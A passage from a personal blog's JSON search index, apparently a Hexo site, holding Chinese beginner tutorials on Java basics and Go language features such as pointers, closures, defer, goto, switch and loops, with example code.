退出DOS系统","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Java编译和运行","slug":"java00000Java编译和运行","date":"2020-02-03T03:22:30.000Z","updated":"2020-02-03T07:22:02.503Z","comments":true,"path":"2020/02/03/java00000Java编译和运行/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/03/java00000Java编译和运行/","excerpt":"","text":"目录: 源文件后缀名 编写java源文件模板 编译和运行 注释 关键字 标识符 常量 数据类型 源文件后缀名 java的源文件后缀名为 *.java 编写java源文件模板 123456public filename&#123; public static void main(String [] args) &#123; System.out.println(\"Hello World.....\"); &#125;&#125; 其中filename对应着源文件名 System.out.println为输出函数 ,输出内容,结尾时换行 编译和运行 编译 javac 文件名 编译成功会生成一个class文件 运行 java 文件名 文件名后面不要带class后缀 注释 // 单行注释 /**/多行注释 1234567891011121314public filename&#123; public static void main(String [] args) &#123; //我是单行注释 /* 我是多行注释 我是多行注释 */ &#125;&#125; 关键字 ​ 特征 ​ 全部小写 ​ 在增强版记事本中有颜色 标识符 命名规则 可以包含字母，数字，下划线，$ 不能以数字开头 标识符不能是关键字 命名规范 类名 大驼峰式 :首字母大写，后面每个单词首字母大写 MyNmae 变量名 小驼峰式：首字母小写，后面每个单词首字母大写nameSize 方法名 小驼峰式：首字母小写，后面每个单词首字母大写nameSize 常量 程序运行期间，固定不变的量 1234567891011121314151617public filename&#123; public static void mian(String[] args) &#123; String a = \"abc\"; //字符串常量 int iZhengXing = 123; //整型常量 float fXiaoShu = 123.2F; //浮点型常量 char cZifu = 'c'; //字符常量 boolean isBool = true; //布尔型常量 //还有一个null 空常量 &#125;&#125; 数据类型 整型 byte， short， int， long 浮点型 ​ float，double 布尔型 ​ boolean 字符型 ​ char ​ 1234567891011121314151617181920public filename&#123; public static void mian(String[] args) &#123; /***********整型************/ byte bXinBie; //1个字节 short sXiaoZheng; //2个字节 int iRenLei; //4个字节 long lShaZi; //4个字节 /**********浮点型************/ float fFengShu; //4个字节 double dYuanZhouLv; //8个字节 /**********布尔型************/ boolean isOk; /**********字符型************/ char cPingFen; //1个字节 &#125;&#125; 注意事项 ​ 字符串不是基本类型，而是引用类型 ​ 浮点型可能只是一个近似值，并非精确值 ​ 数据范围与字节数不一定相关，例如float数据比long更加广泛，但是float更加广泛 ​ 浮点数默认是double类型，如果要用float类型要加后缀F ​ 整数默认类型是int，如果要用long，后缀要加L","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"个人简历","slug":"个人简历","date":"2019-12-07T10:59:46.000Z","updated":"2019-12-07T10:59:46.442Z","comments":true,"path":"2019/12/07/个人简历/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/12/07/个人简历/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"个人经历","slug":"个人经历","date":"2019-12-07T10:57:37.000Z","updated":"2019-12-07T10:57:37.110Z","comments":true,"path":"2019/12/07/个人经历/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/12/07/个人经历/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Golang 指针","slug":"201912050104","date":"2019-12-04T17:05:00.000Z","updated":"2019-12-04T17:06:13.569Z","comments":true,"path":"2019/12/05/201912050104/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/12/05/201912050104/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121package main/*%T 类型占位符%v 值占位符%p 地址（指针）占位符，只有地址才能替换%p&amp;value 对值取地址*addr 对地址取值**int 指向int型指针的指针作用：函数传参时，传递指针叫引用传递，值传递是拷贝式的，对被传参数的修改是不会改变本体的，想要改变本体只能是引用传递*/import \"fmt\"//指针就是地址//&amp;value 对值取地址//*ptr 对地址取值func main021() &#123; //声明变量a时，系统开辟了一块内存【地址】，里面存的【值】是123 var a int = 123 fmt.Printf(\"a的类型是%T\\n\", a)//int fmt.Printf(\"a的值是%v\\n\", a)//123 fmt.Printf(\"a的地址是%p\\n\", &amp;a)//0x... //&amp;a取变量a的地址 aPointer := &amp;a fmt.Printf(\"aPointer的类型是%T\\n\",aPointer)//*int //将aPointer指向的地址中的值修改为456 *aPointer = 456 fmt.Println(\"*aPointer=\",*aPointer)//456 //a的值就变成了456 fmt.Println(\"a=\",a)&#125;//先定义原始变量，修改其指针中的值，会直接改变原变量//指针如果没有重新赋值，永远指向同一块地址func main022() &#123; //系统给x分配了内存 var x = 456 fmt.Println(x)//456 //定义整型指针（存储整型数据的地址） //默认赋值为空&lt;nil&gt; var xPtr *int fmt.Println(\"xPtr=\", xPtr)//nil //aPtr指向x的地址 xPtr = &amp;x //将xPtr指向的地址中的值修改为789 *xPtr = 789 fmt.Println(x) //789 fmt.Println(xPtr) //0xc042052080 fmt.Println(&amp;x) //0xc042052080 fmt.Println(*xPtr) //789 fmt.Println(*xPtr == x) //true fmt.Println(xPtr == &amp;x) //true var y = 456 *xPtr = y fmt.Println(x) //456 fmt.Println(xPtr) //没有变 fmt.Println(&amp;x) //没有变 fmt.Println(*xPtr) //456 fmt.Println(*xPtr == y) //true fmt.Println(x == y) //true fmt.Println(&amp;x == &amp;y) //false fmt.Println(xPtr == &amp;y) //false fmt.Printf(\"y的地址是%p\\n\",&amp;y) fmt.Println(\"----------\") //xPtr指向y的地址 xPtr = &amp;y y = 789 fmt.Println(x) //456 fmt.Println(y) //789 fmt.Println(*xPtr) //789 fmt.Println(&amp;x == xPtr) //false&#125;//指针是严格检测数据类型的func main023() &#123; var x = 123 var intPtr *int intPtr = &amp;x fmt.Println(intPtr, *intPtr) //0x...,123 //var y = \"你妹\" //intPtr = &amp;y//编译错误，【整型指针】无法赋值为【字符串的地址】&#125;//指针的指针func main024() &#123; var x = 123 var mPtr *int = &amp;x //var mmp **int mmPtr := &amp;mPtr fmt.Println(mmPtr)//0xc042072018 fmt.Printf(\"mmPtr的类型是%T\\n\",mmPtr)//mmPtr的类型是**int //打印x的值 fmt.Println(*mPtr)//123 fmt.Println(*(*mmPtr))//123 fmt.Println(**mmPtr)//123&#125;func test()&#123;&#125;func main() &#123; //main021() //main022() //main023() main024()&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang指针","slug":"Golang指针","permalink":"https://xiaowuyoucy.github.io/tags/Golang指针/"}]},{"title":"Hello World","slug":"hello-world","date":"2019-11-27T08:08:58.620Z","updated":"2019-11-27T08:08:58.620Z","comments":true,"path":"2019/11/27/hello-world/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/27/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post 1$ hexo new \"My New Post\" More info: Writing Run server 1$ hexo server More info: Server Generate static files 1$ hexo generate More info: Generating Deploy to remote sites 1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"Golang闭包函数","slug":"201911190628","date":"2019-11-18T22:28:00.000Z","updated":"2019-11-30T17:34:35.064Z","comments":true,"path":"2019/11/19/201911190628/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190628/","excerpt":"","text":"闭包函数 闭包函数概述 闭包函数：返回函数的函数 闭包的好处：【内层函数的状态】被保存在闭包中 不使用闭包，就要开 辟多个全局变量来保存函数以外的数据 如果说这个函数被多方调用，大家都需要各保存各的数据，那么此时就需要开辟多个全局变量 具体使用哪个全局变量，还要在函数内做判断——增大了重复的代码量，令代码看起来比较垃圾 案例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package mainimport \"fmt\"/*李逵和武松的Study方法的逻辑是几乎一模一样的然而为了分别保存二人的学习进度，需要开辟两个全局变量，函数内部需要使用两条分支结构才能完成业务逻辑；如果是108将都来学习...此时代码的可复用性很差！*/var likuiProgress int //0var wusongProgress int //0func Study(name string,hours int) &#123; fmt.Printf(\"%s学习了%d小时\\n\",name,hours) if name==\"李逵\"&#123; likuiProgress += hours &#125;else if name==\"武松\"&#123; wusongProgress += hours &#125;&#125;func main081() &#123; Study(\"李逵\", 5) fmt.Printf(\"李逵的学习进度是%d/10000\\n\",likuiProgress) Study(\"武松\", 15) fmt.Printf(\"李逵的学习进度是%d/10000\\n\",wusongProgress)&#125;/*使用闭包函数优化Study每个人有不同的学习进度，将这个进度保存在【各自的闭包】中*//*闭包函数：返回函数的函数闭包函数的好处：使用同一份内层函数代码，创建出任意多个不同的函数对象，这些对象各自的状态都被保存在函数闭包（外层函数）中，各行其道互不干扰*/func GetStudyFunc(name string) func(hours int) (progress int) &#123; //用于保存内层函数的状态 var progress int //定义内层函数 studyFunc := func(hours int) int &#123; fmt.Printf(\"%s学习了%d小时\\n\",name,hours) //更新内层函数在闭包中的状态 progress += hours return progress &#125; fmt.Printf(\"study的类型是%T\\n\", studyFunc) //返回内层函数 return studyFunc&#125;func main() &#123; //调用闭包函数，得到三个【代码相同的不同函数对象】 studyFunc1 := GetStudyFunc(\"李逵\") studyFunc2 := GetStudyFunc(\"武松\") studyFunc3 := GetStudyFunc(\"鲁智深\") //交替执行这些内层函数，其状态的更新会被其函数闭包所保存 lkProgress := studyFunc1(5) lzsProgress := studyFunc3(17) wsProgress := studyFunc2(15) lkProgress = studyFunc1(3) lzsProgress = studyFunc3(12) lkProgress = studyFunc1(2) wsProgress = studyFunc2(13) //输出结果，三个函数的各自的状态没有互相影响 fmt.Printf(\"李逵的学习进度是%d/10000\\n\",lkProgress) fmt.Printf(\"武松的学习进度是%d/10000\\n\",wsProgress) fmt.Printf(\"鲁智深的学习进度是%d/10000\\n\",lzsProgress)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang闭包函数","slug":"Golang闭包函数","permalink":"https://xiaowuyoucy.github.io/tags/Golang闭包函数/"}]},{"title":"Golang匿名函数","slug":"201911190625","date":"2019-11-18T22:26:00.000Z","updated":"2019-11-18T22:27:43.510Z","comments":true,"path":"2019/11/19/201911190625/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190625/","excerpt":"","text":"匿名函数概述 匿名函数的主要作用是封装一段一次性执行的代码 它无所谓复用，所以无需起名，之所以进行封装的意义，在于使一段代码成为一个整体 defer延时执行一段代码，和go并发执行一段代码是匿名函数的常用场景 123456789101112131415161718//匿名函数func main() &#123;//延时执行的匿名函数defer func() &#123;fmt.Println(\"劳资延时·无名，劳资最后执行\")&#125;()//并发执行的匿名函数go func() &#123;fmt.Println(\"劳资并发·无名，劳资并发执行\")&#125;()//一个带参的匿名函数ret := func(a, b int) int &#123;fmt.Println(\"劳资普通·无名，下面劳资睡一会\")time.Sleep(1)return a + b&#125;(2, 3)fmt.Println(ret)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang匿名函数","slug":"Golang匿名函数","permalink":"https://xiaowuyoucy.github.io/tags/Golang匿名函数/"}]},{"title":"函数","slug":"201911190615","date":"2019-11-18T22:15:00.000Z","updated":"2019-11-18T22:23:31.611Z","comments":true,"path":"2019/11/19/201911190615/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190615/","excerpt":"","text":"函数概述 函数是对一段能够重复使用的代码的封装 函数的参数定义了外界给函数输入的数据 函数的返回值定义了函数给外界输出的数据 Go语言函数支持不定长参数和多个返回值 @函数定义和调用 123456//定义函数func sayHello() &#123;fmt.Println(\"fuck off!\")&#125;//调用函数sayHello() @函数参数 无参函数 123func add0() &#123;fmt.Println(\"没参数，add你妹啊\")&#125; 带参函数 1234func add1(a int) &#123;fmt.Println(\"收到一个参数\", a)fmt.Println(\"一个参数，add你妹啊\")&#125; 多个参数 123456789101112//多个参数func addm1(a int, b int) &#123;fmt.Println(\"加和是\", a+b)&#125;//类型相同的参数被合写在一起了func addm2(a, b int) &#123;fmt.Println(\"加和是\", a+b)&#125;//类型不同的参数func addm3(a, b int, c float32) &#123;fmt.Println(\"加和是\", float32(a)+float32(b)+c)&#125; 不定长参数 1234567891011121314func addx(x ...int) &#123;//参数的长度是 5fmt.Println(\"参数的长度是\", len(x))//参数的类型是[]intfmt.Printf(\"参数的类型是%T\\n\", x)var result = 0//遍历不定长参数for i, v := range x &#123;fmt.Println(i, v)result += v&#125;//加和是 15fmt.Println(\"加和是\", result)&#125; @函数返回值 无返回值 1234//无返回值func sub0(a, b int) &#123;fmt.Println(\"相减的结果是\", a-b)&#125; 有返回值 12345678910//有返回值func sub11(a, b int) int &#123;fmt.Println(\"相减的结果是\", a-b)return a - b&#125;func sub12(a, b int) (ret int) &#123;fmt.Println(\"相减的结果是\", a-b)ret = a - breturn&#125; 多个返回值 1234567891011//多个返回值func subm1(a, b int) (int, string) &#123;fmt.Println(\"相减的结果是\", a-b)return a - b, \"你妹\"&#125;func subm2(a, b int) (ret int, remark string) &#123;fmt.Println(\"相减的结果是\", a-b)ret = a - bremark = \"你妹\"return&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang函数","slug":"Golang函数","permalink":"https://xiaowuyoucy.github.io/tags/Golang函数/"}]},{"title":"Golang延时执行defer","slug":"201911190306","date":"2019-11-18T19:09:00.000Z","updated":"2019-11-18T19:21:46.056Z","comments":true,"path":"2019/11/19/201911190306/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190306/","excerpt":"","text":"defer概述 defer xxx() 延时执行，将xxx放在函数的最后执行 多个defer xxx()时,所有defer倒序执行，即最早声明 的defer会最后执行 用途 (数据库读写，文件读写，网络数据读写) 资源=数据库连接，打开的文件对象，网路连接 资源开销（CPU，内存，磁盘…）巨大 资源，随用随开，用完【即】关 场景 O只是场景之一 其它场景：消费完毕要买单，运动完要洗澡，自习结束要关灯… 读写数据库，并在程序的最后关闭数据库 12345678func demo41() &#123;//随用随开，用完【即】关fmt.Println(\"打开数据库\")//defer所唤起的函数将在函数结束前才执行defer closeDatabase()fmt.Println(\"愉快地读写数据\")fmt.Println(\"读写完毕\")&#125; 多个defer时，最早defer的操作最后执行 12345678910111213141516171819202122func demo42() &#123;//打开数据库fmt.Println(\"打开数据库\")defer closeDatabase()//读入DB数据fmt.Println(\"读入DB数据\")//打开文件fmt.Println(\"打开文件\")defer closeFile()//向文件中写出DB中的数据fmt.Println(\"读入DB数据\")//关闭文件//继续操作数据库fmt.Println(\"继续操作数据库\")//关闭数据库&#125;func closeDatabase() &#123;fmt.Println(\"关闭数据库\")&#125;func closeFile() &#123;fmt.Println(\"关闭文件\")&#125; 其他defer案例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package mainimport \"fmt\"func xingzuoZhensuo() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt;= \"0823\" &amp;&amp; birthday &lt;= \"0922\" &#123; fmt.Println(\"阁下真乃神人也\") &#125; else if birthday &gt;= \"0923\" &amp;&amp; birthday &lt;= \"1022\" &#123; fmt.Println(\"阁下是天秤座\") &#125; else if birthday &gt;= \"1023\" &amp;&amp; birthday &lt;= \"1122\" &#123; fmt.Println(\"阁下是天蝎座\") &#125; else if birthday &gt;= \"1123\" &amp;&amp; birthday &lt;= \"1222\" &#123; fmt.Println(\"阁下是射手座\") &#125; else if (birthday &gt;= \"1223\" &amp;&amp; birthday &lt;= \"1231\") || (birthday &gt;= \"0101\" &amp;&amp; birthday &lt;= \"0122\") &#123; fmt.Println(\"阁下是摩羯座\") &#125; else if birthday &gt;= \"0123\" &amp;&amp; birthday &lt;= \"0222\" &#123; fmt.Println(\"阁下是水瓶座\") &#125; else if (birthday &gt;= \"0223\" &amp;&amp; birthday &lt;= \"0229\") || (birthday &gt;= \"0301\" &amp;&amp; birthday &lt;= \"0322\") &#123; fmt.Println(\"阁下是双鱼座\") &#125; else if birthday &gt;= \"0323\" &amp;&amp; birthday &lt;= \"0422\" &#123; fmt.Println(\"阁下是白羊座\") &#125; else if birthday &gt;= \"0423\" &amp;&amp; birthday &lt;= \"0522\" &#123; fmt.Println(\"阁下是金牛座\") &#125; else if birthday &gt;= \"0523\" &amp;&amp; birthday &lt;= \"0622\" &#123; fmt.Println(\"阁下是双子座\") &#125; else if birthday &gt;= \"0623\" &amp;&amp; birthday &lt;= \"0722\" &#123; fmt.Println(\"阁下是巨蟹座\") &#125; else if birthday &gt;= \"0723\" &amp;&amp; birthday &lt;= \"0822\" &#123; fmt.Println(\"阁下是狮子座\") &#125; else &#123; fmt.Println(\"阁下就是传说中的蛇夫座鸭！\") &#125;&#125;func main071() &#123; fmt.Println(\"亲爱的患者，欢迎来到我院！\") //挂起一个延时任务（在当前函数返回（结束）前执行） defer fmt.Println(\"同志再见，我院永远欢迎你！\") xingzuoZhensuo() fmt.Println(\"事务A\") fmt.Println(\"事务B\") fmt.Println(\"事务C\")&#125;/*·诊断完毕后连续输出“您的诊断已结束”,“请这边滚”，“我院永远欢迎你”*/func main() &#123; fmt.Println(\"亲爱的患者，欢迎来到我院！\") /*多个defer时，执行顺序是倒置的*/ //第1个defer会倒数第1个执行 defer fmt.Println(\"我院永远欢迎你\") //第2个defer会倒数第2个执行 defer fmt.Println(\"请这边滚\") //第3个defer会倒数第3个执行 defer fmt.Println(\"您的诊断已结束\") xingzuoZhensuo() fmt.Println(\"事务A\") fmt.Println(\"事务B\") fmt.Println(\"事务C\")&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"延时执行defer","slug":"延时执行defer","permalink":"https://xiaowuyoucy.github.io/tags/延时执行defer/"}]},{"title":"Golang的跳转语句（GOTO）","slug":"201911190123","date":"2019-11-18T17:25:00.000Z","updated":"2019-11-18T17:26:00.356Z","comments":true,"path":"2019/11/19/201911190123/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/19/201911190123/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport ( \"fmt\" \"time\")func main() &#123;STUDYHARD: fmt.Println(\"开始努力奋斗！\") var i int = 0 for &#123; fmt.Printf(\"努力奋斗了%d小时\\n\", i) time.Sleep(500 * time.Millisecond) i++ if i &gt; 10 &#123; //跳出当前循环 //break fmt.Println(\"恭喜你获得了组织颁发的奖状！\") goto TRYAGIN &#125; &#125; BONUS: fmt.Println(\"循环外的世界\") fmt.Println(\"送你海景别野一套\") fmt.Println(\"送你满汉全席一套\") fmt.Println(\"送你我厂生产的女朋友一个\")TRYAGIN: var answer string fmt.Println(\"要不要再玩一次呢？Y/N\") fmt.Scan(&amp;answer) if answer == \"N\" &#123; goto GAMEOVER &#125; else if answer == \"Y\" &#123; goto STUDYHARD &#125;else if answer == \"FUCKOFF\"&#123; goto BONUS &#125;GAMEOVER: fmt.Println(\"GAME OVER\")&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"GOTO语句","slug":"GOTO语句","permalink":"https://xiaowuyoucy.github.io/tags/GOTO语句/"}]},{"title":"Golang流程控制","slug":"201911182336","date":"2019-11-18T15:37:00.000Z","updated":"2019-11-18T16:01:40.381Z","comments":true,"path":"2019/11/18/201911182336/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/18/201911182336/","excerpt":"","text":"if else 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport \"fmt\"/*字符串比大小比首字符在字符集中出现的序号，首字符相同则比较第二个字符，以此类推go的编译器默认使用UTF8字符集在UTF8字符集中数字出现的顺序为：0123456789*/func main031() &#123; fmt.Println(\"0\"&gt;\"9\") fmt.Println(\"012\"&gt;\"011\") fmt.Println(\"0823\"&gt;\"0423\")&#125;/*根据用户输入的生日判断其星座：①单分支：如果位于0823-0922之间（处女座），输出“阁下真乃神人也！”*/func main032() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt;= \"0823\" &amp;&amp; birthday&lt;=\"0922\"&#123; fmt.Println(\"阁下真乃神人也\") &#125; fmt.Println(\"诊断结束！\")&#125;/*根据用户输入的生日判断其星座：②双分支：如果位于0823-0922之间（处女座），输出“阁下乃神人也！”，否则输出“垃圾”*/func main033() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt; \"0822\" &amp;&amp; birthday &lt; \"0923\"&#123; fmt.Println(\"阁下真乃神人也\") &#125;else&#123; fmt.Println(\"乐色\") &#125;&#125; else if 多分支 1234567891011121314151617181920212223242526272829303132333435363738/*根据用户输入的生日判断其星座：③多分支：判断其具体星座*/func main034() &#123; var birthday string fmt.Println(\"请输入您的生日，例如0823\") fmt.Scan(&amp;birthday) if birthday &gt;= \"0823\" &amp;&amp; birthday &lt;= \"0922\"&#123; fmt.Println(\"阁下真乃神人也\") &#125;else if birthday &gt;= \"0923\" &amp;&amp; birthday &lt;= \"1022\"&#123; fmt.Println(\"阁下是天秤座\") &#125;else if birthday &gt;= \"1023\" &amp;&amp; birthday &lt;= \"1122\"&#123; fmt.Println(\"阁下是天蝎座\") &#125;else if birthday &gt;= \"1123\" &amp;&amp; birthday &lt;= \"1222\"&#123; fmt.Println(\"阁下是射手座\") &#125;else if (birthday &gt;= \"1223\" &amp;&amp; birthday &lt;= \"1231\") || (birthday&gt;=\"0101\" &amp;&amp; birthday&lt;=\"0122\")&#123; fmt.Println(\"阁下是摩羯座\") &#125;else if birthday &gt;= \"0123\" &amp;&amp; birthday &lt;= \"0222\"&#123; fmt.Println(\"阁下是水瓶座\") &#125;else if (birthday &gt;= \"0223\" &amp;&amp; birthday &lt;= \"0229\")||(birthday&gt;=\"0301\" &amp;&amp; birthday&lt;=\"0322\")&#123; fmt.Println(\"阁下是双鱼座\") &#125;else if birthday &gt;= \"0323\" &amp;&amp; birthday &lt;= \"0422\"&#123; fmt.Println(\"阁下是白羊座\") &#125;else if birthday &gt;= \"0423\" &amp;&amp; birthday &lt;= \"0522\"&#123; fmt.Println(\"阁下是金牛座\") &#125;else if birthday &gt;= \"0523\" &amp;&amp; birthday &lt;= \"0622\"&#123; fmt.Println(\"阁下是双子座\") &#125;else if birthday &gt;= \"0623\" &amp;&amp; birthday &lt;= \"0722\"&#123; fmt.Println(\"阁下是巨蟹座\") &#125;else if birthday &gt;= \"0723\" &amp;&amp; birthday &lt;= \"0822\"&#123; fmt.Println(\"阁下是狮子座\") &#125;else&#123; fmt.Println(\"阁下就是传说中的蛇夫座鸭！\") &#125;&#125; SWITCH 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128package mainimport \"fmt\"/*@星座诊所2(switch)根据用户输入的出生月份猜测其星座：·白羊（4） 金牛（5） 双子（6） 巨蟹（7） 狮子（8） 处女（9） 天平（10） 天蝎（11） 射手（12） 摩羯（1） 水瓶（2） 双鱼（3）·使用单点case判断其星座；·使用单点case集合判断其季节（春夏秋冬）·使用自由条件case判断用户具体星座*/func main041() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) fmt.Printf(\"month=%d\", month) /* 对month的可能取值，做单点判断 */ switch month &#123; case 1: fmt.Printf(\"你大概率是%s座\\n\", \"摩羯\") case 2: fmt.Printf(\"你大概率是%s座\\n\", \"水瓶\") case 3: fmt.Printf(\"你大概率是%s座\\n\", \"双鱼\") case 4: fmt.Printf(\"你大概率是%s座\\n\", \"白羊\") case 5: fmt.Printf(\"你大概率是%s座\\n\", \"金牛\") case 6: fmt.Printf(\"你大概率是%s座\\n\", \"双子\") case 7: fmt.Printf(\"你大概率是%s座\\n\", \"巨蟹\") case 8: fmt.Printf(\"你大概率是%s座\\n\", \"狮子\") case 9: fmt.Printf(\"你大概率是%s座\\n\", \"处女\") case 10: fmt.Printf(\"你大概率是%s座\\n\", \"天平\") case 11: fmt.Printf(\"你大概率是%s座\\n\", \"天蝎\") case 12: fmt.Printf(\"你大概率是%s座\\n\", \"射手\") //month的值没有落在上述任何一种情形中 //default是可选的 default: fmt.Println(\"你就是传说中的蛇夫座\") &#125;&#125;/*·使用单点case集合判断其季节（春夏秋冬）*/func main042() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) switch month &#123; case 12, 1, 2: fmt.Println(\"你出生在冬天\") case 3, 4, 5: fmt.Println(\"你出生在春天\") case 6, 7, 8: fmt.Println(\"你出生在夏天\") case 9, 10, 11: fmt.Println(\"你出生在秋天\") default: fmt.Println(\"你出生在火星\") &#125;&#125;/*·使用自由条件case判断其季节（春夏秋冬）*/func main043() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) // 没有明确指定switch的对象，case可以跟任意判断条件 switch &#123; case month &gt;= 3 &amp;&amp; month &lt;= 5: fmt.Println(\"你出生在春天\") case month &gt;= 6 &amp;&amp; month &lt;= 8: fmt.Println(\"你出生在夏天\") case month &gt;= 9 &amp;&amp; month &lt;= 11: fmt.Println(\"你出生在秋天\") case month == 12 || month == 1 || month == 2: fmt.Println(\"你出生在冬天\") default: fmt.Println(\"你出生在火星\") &#125;&#125;/*使用fallthrough强制滚动到下一个分支并执行*/func main044() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) // 没有明确指定switch的对象，case可以跟任意判断条件 switch &#123; case month &gt;= 3 &amp;&amp; month &lt;= 5: fmt.Println(\"你出生在春天\") //强制执行下一个分支条件 fallthrough case month &gt;= 6 &amp;&amp; month &lt;= 8: fmt.Println(\"你出生在夏天\") fmt.Println(\"我们出生在上半年\") case month &gt;= 9 &amp;&amp; month &lt;= 11: fmt.Println(\"你出生在秋天\") //强制执行下一个分支条件 fallthrough case month == 12 || month == 1 || month == 2: fmt.Println(\"你出生在冬天\") fmt.Println(\"我们出生在下半年\") default: fmt.Println(\"你出生在火星\") &#125;&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang流程控制","slug":"Golang流程控制","permalink":"https://xiaowuyoucy.github.io/tags/Golang流程控制/"}]},{"title":"Golang类型转换及移位运算","slug":"201911180045","date":"2019-11-17T16:46:00.000Z","updated":"2019-11-17T17:24:35.343Z","comments":true,"path":"2019/11/18/201911180045/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/18/201911180045/","excerpt":"","text":"类型转换 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/*类型转换强化整型和浮点型可以直接强制转换字符串和数值的转换用strconv.ParseInt和strconv.ParseFloat*/func main024() &#123; var a int = 123 var b float64 = 456.78 //将整型转换为浮点型 aFloat := float64(a) //%T类型占位符，%v是值占位符 fmt.Printf(\"aFloat的类型是%T,值是%v\\n\",aFloat,aFloat) //浮点型转整型，小数部分扔掉 //bInt := int32(b) bInt := int(b) fmt.Printf(\"bInt的类型是%T,值是%v\\n\",bInt,bInt) //字符串转整型 resultInt, _ := strconv.ParseInt(\"123\", 0, 64) fmt.Printf(\"resultInt的类型是%T,值是%v\\n\",resultInt,resultInt) //字符串转浮点型 resultFloat, _ := strconv.ParseFloat(\"123.45\", 64) fmt.Printf(\"resultFloat的类型是%T,值是%v\\n\",resultFloat,resultFloat)&#125;/*移位运算强化*/func main() &#123; //10111 var a uint8 = 23 fmt.Println(a&gt;&gt;3)//2 //左移 fmt.Println(a&lt;&lt;3)//184 //继续移动，从左侧溢出，当前无符号，最高位是数据位而非符号位 fmt.Println(a&lt;&lt;5)//224 //定义有符号8位整型 var b int8 = 23 //10111000,最高位为1，为负数，为补码，减一取反得其原码（原码到补码取反加一的逆向） fmt.Println(b&lt;&lt;3)//-72&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang类型转换及移位运算","slug":"Golang类型转换及移位运算","permalink":"https://xiaowuyoucy.github.io/tags/Golang类型转换及移位运算/"}]},{"title":"Golang循环结构","slug":"201911190001","date":"2019-11-17T16:03:00.000Z","updated":"2019-11-18T19:33:59.906Z","comments":true,"path":"2019/11/18/201911190001/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/18/201911190001/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175package mainimport ( \"fmt\" \"math/rand\" \"time\")/*无限循环，死循环输出我爱拉芳，一直到死*/func main051() &#123; for &#123; fmt.Println(\"我爱拉芳\") time.Sleep(1 * time.Second) &#125;&#125;/*有限循环输出我爱拉芳，100遍for 起始条件;循环条件;增长条件&#123; 循环体&#125;*/func main052() &#123; /* var i int for i = 1; i &lt;= 10; i++ &#123; fmt.Printf(\"我爱拉芳%d年了\\n\", i) time.Sleep(1000 * time.Millisecond) &#125;*/ for i := 0; i &lt; 10; i++ &#123; fmt.Printf(\"我爱拉芳%d年了\\n\", i) time.Sleep(1000 * time.Millisecond) &#125; fmt.Println(\"终于可以爱别人了！\")&#125;/*倒序循环*/func main053() &#123; for i := 10; i &gt;= 1; i-- &#123; fmt.Println(i) time.Sleep(500 * 